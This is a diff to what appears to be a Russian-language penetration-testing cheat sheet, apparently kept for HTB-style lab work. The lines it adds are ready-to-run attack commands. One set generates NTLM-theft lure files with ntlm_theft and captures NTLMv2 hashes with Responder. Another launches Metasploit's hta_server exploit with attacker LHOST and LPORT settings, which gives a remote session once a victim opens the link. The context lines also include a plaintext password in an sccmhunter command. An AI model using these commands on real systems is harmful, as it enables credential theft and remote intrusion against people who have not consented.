@@ -1668,6 +1668,7 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 
 	pipx install git+https://github.com/garrettfoster13/sccmhunter/
 	sccmhunter.py find -u adm -p 'Apolo' -d kaban.zazprom.ru -dc-ip 10.*.*.*-debug
+# Exchange
 
 # Proxylogon
 	
@@ -1719,3 +1720,16 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 	   Id  Name
    	--  ----
    	0   Windows Powershell
+# кражи хешей NTLMv2
+
+	https://ipaddress/sharename/picture.ico
+	
+	git clone -q https://github.com/Greenwolf/ntlm_theft
+	cd ntlm_theft
+	python3 ntlm_theft.py -g htm -s <my_ip> -f student
+	sudo responder -I tun0 
+# Произвольное выполнение файла
+
+	msfconsole -x "use exploit/windows/misc/hta_server; set LHOST 10.10.14.207; set LPORT 8443; set SRVHOST 10.10.14.207; run -j" 
+	После того, как пользователь перейдет по ссылке и откроет файл, будет создана сессия Metasploit: 
+	
